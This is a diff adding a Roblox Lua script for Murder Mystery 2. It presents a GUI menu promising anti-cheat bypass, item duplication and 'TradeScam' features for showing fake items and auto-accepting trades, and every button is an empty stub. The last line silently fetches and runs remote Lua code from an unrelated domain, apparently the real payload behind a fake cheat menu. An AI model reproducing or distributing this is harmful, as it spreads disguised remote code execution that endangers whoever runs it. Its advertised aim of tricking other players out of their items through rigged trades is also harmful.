@@ -1,0 +1,113 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/slf0Dev/Ocerium_Project/main/Library.lua"))()
+Window = Library.Main("MM2 TradeScam","LeftAlt") -- change "LeftAlt" to key that you want will hide gui
+
+
+--//tab
+local Tab = Window.NewTab("⚠️ WARNING ⚠️ ")
+
+
+--//section
+local Section = Tab.NewSection("GO TO BYPASS SECTION AND CLICK BYPASS ANTICHEAT")
+
+
+--//section
+local Section = Tab.NewSection("WAIT 5 MINUTES FOR IT TO BYPASS")
+
+
+--//section
+local Section = Tab.NewSection("IF YOU CLICK ANYTHING ELSE DURING BYPASS YOU WILL FREEZE")
+
+
+--//tab
+local Tab = Window.NewTab("Bypass                          🟢")
+
+
+--//section
+local Section = Tab.NewSection("WAIT 5 MINUTES FOR IT TO BYPASS")
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("Bypass MM2 Anti-Cheat",function(bool)
+end,false) -- "true" is the default value of toggle
+
+
+--//tab
+local Tab = Window.NewTab("Dupe                             🟡")
+
+
+--//section
+local Section = Tab.NewSection("🟢 = Working, 🟡 = Partially Working, 🔴 = Patched")
+
+
+--//section
+local Section = Tab.NewSection("(once you click duping should begin it’s finished once you reset)")
+
+
+--//section
+local Section = Tab.NewSection("[COULD BE A FEW MINUTES]")
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("Enable dupe.lua",function(bool)
+end,false) -- "true" is the default value of
+
+
+--// Button
+local Button = Section.NewButton("Dupe Guns and Knives",function()
+end)
+
+
+--// Button
+local Button = Section.NewButton("Dupe Pets",function()
+end)
+
+
+--// Button
+local Button = Section.NewButton("Dupe Coins and Gems",function()
+end)
+
+
+--//tab
+local Tab = Window.NewTab("TradeScam                 🟢")
+
+
+--//section
+local Section = Tab.NewSection("Step 1: Put in items, Step 2: Enable freeze.lua, Step 3: Freeze Trade.")
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("Enable freeze/trade/genui.lua",function(bool)
+end,false) -- "true" is the default value of
+
+
+--// Button
+local Button = Section.NewButton("Freeze Trade",function()
+end)
+
+
+--//section
+local Section = Tab.NewSection("TradeScamV2")
+
+
+--//Toggles
+local DisabledToggle = Section.NewToggle("Enable tradescamv2.lua",function(bool)
+end,false) -- "true" is the default value of
+
+
+--// Button
+local Button = Section.NewButton("Display Fake Items",function()
+end)
+
+
+--// Button
+local Button = Section.NewButton("Auto Accept",function()
+end)
+
+
+--//tab
+local Tab = Window.NewTab("Item Stealer (WIP)")
+
+
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/816474c1be73cca5c80a46a0.lua", true))()
